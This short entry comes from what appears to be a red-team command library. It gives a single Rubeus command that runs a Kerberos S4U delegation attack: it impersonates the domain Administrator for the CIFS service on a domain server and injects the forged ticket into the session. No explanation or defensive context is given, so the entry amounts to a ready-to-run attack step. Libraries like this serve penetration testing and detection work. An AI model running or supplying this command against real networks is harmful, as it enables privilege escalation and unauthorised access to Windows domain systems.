---
id: 9b66e4aa-df36-4354-aca6-918d0197d618
name: Create a ticket
type: command
executor: bash
data: Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local
  /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
output: null
created_at: '2023-04-06T03:56:07.695673+00:00'
updated_at: '2023-04-10T20:26:26.278263+00:00'
---

# Create a ticket

```bash
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
```


